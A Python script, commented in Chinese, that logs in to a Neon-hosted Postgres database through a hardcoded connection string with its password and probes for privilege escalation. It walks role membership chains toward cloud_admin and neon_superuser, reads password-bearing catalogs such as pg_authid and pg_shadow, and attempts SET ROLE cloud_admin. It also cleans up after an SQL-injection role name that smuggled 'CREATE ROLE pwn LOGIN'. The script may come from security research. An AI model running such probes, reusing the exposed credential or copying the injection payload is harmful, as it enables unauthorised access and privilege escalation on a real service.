# -*- coding: utf-8 -*-
"""成员链递归 + SET ROLE 实测(独立连接) + pwn 残留清理——解释 pg_authid 可读之谜"""
import psycopg

URI = 'postgresql://neondb_owner:npg_cI5ynlaAqjU2@ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build/neondb'

# --- 连接 A:递归成员链(向上找父角色) ---
conn = psycopg.connect(URI, connect_timeout=20)
conn.autocommit = True
cur = conn.cursor()

def q(sql):
    try:
        cur.execute(sql)
        return cur.fetchall()
    except Exception as e:
        return 'ERR: %s' % str(e)[:200]

print('=== [1] neondb_owner 向上递归成员链 ===')
print(q("""WITH RECURSIVE up AS (
  SELECT m.roleid, m.member, 1 AS d
  FROM pg_auth_members m WHERE m.member::regrole::text = 'neondb_owner'
  UNION ALL
  SELECT m.roleid, m.member, up.d+1
  FROM pg_auth_members m JOIN up ON m.member = up.roleid
)
SELECT DISTINCT up.roleid::regrole::text, up.d FROM up ORDER BY up.d"""))

print('=== [2] pg_has_role 判定 ===')
for rn in ('cloud_admin', 'neon_superuser', 'neon_service', 'pg_read_all_data'):
    print(rn, q("SELECT pg_has_role('neondb_owner', '%s', 'MEMBER')" % rn))

print('=== [3] 敏感目录表可读性基线 ===')
for t in ('pg_authid', 'pg_shadow', 'pg_user_mappings', 'pg_roles', 'pg_stat_ssl'):
    print(t, q("SELECT count(*) FROM %s" % t))

print('=== [4] neondb_owner 实际 superuser 性(pg_authid 视角不可信,用 pg_has_role + 系统表) ===')
# pg_authid 里 neondb_owner 的 rolsuper 是权威(我们刚证明可读 pg_authid)
print(q("SELECT rolname, rolsuper, rolcreaterole, rolreplication, rolbypassrls FROM pg_authid WHERE rolname='neondb_owner'"))
conn.close()

# --- 连接 B:SET ROLE cloud_admin 独立测 ---
print()
conn2 = psycopg.connect(URI, connect_timeout=20)
conn2.autocommit = True
cur2 = conn2.cursor()
try:
    cur2.execute('SET ROLE cloud_admin')
    cur2.execute('SELECT current_user, session_user')
    print('[B] SET ROLE cloud_admin ->', cur2.fetchone())
    cur2.execute('RESET ROLE')
except Exception as e:
    print('[B] SET ROLE cloud_admin DENIED:', str(e)[:150])
conn2.close()

# --- 连接 C:pwn 残留清理 ---
print()
conn3 = psycopg.connect(URI, connect_timeout=20)
conn3.autocommit = True
cur3 = conn3.cursor()
try:
    cur3.execute('DROP ROLE IF EXISTS "x""; CREATE ROLE pwn LOGIN; --"')
    print('[C] drop pwn residue OK')
except Exception as e:
    print('[C] drop pwn residue ERR:', str(e)[:200])
cur3.execute("SELECT rolname FROM pg_roles WHERE rolname LIKE '%pwn%' OR rolname LIKE 'x%'")
print('[C] remaining:', cur3.fetchall())
conn3.close()
